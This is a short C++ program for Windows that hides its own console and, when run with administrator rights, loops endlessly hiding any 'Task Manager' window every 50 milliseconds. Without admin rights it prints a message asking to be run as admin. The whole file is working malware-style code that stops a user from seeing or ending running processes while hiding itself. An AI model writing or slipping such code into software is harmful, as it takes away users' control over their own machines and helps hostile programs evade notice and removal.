#include <Windows.h>
#include <ShlObj.h>
#include <iostream>

using std::cout;
using std::endl;

int main() {
	HWND Console;
	Console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Console, 0);
	if (IsUserAnAdmin() == 1) {
		while (1) {
			HWND TaskMgr;
			TaskMgr = FindWindowA(NULL, "Task Manager");
			ShowWindow(TaskMgr, 0);
			Sleep(50);
		}
	}
	else {
		ShowWindow(Console, 1);
		cout << "Your don't have administrative right! Try running this program as Admin.." << endl;
	}
}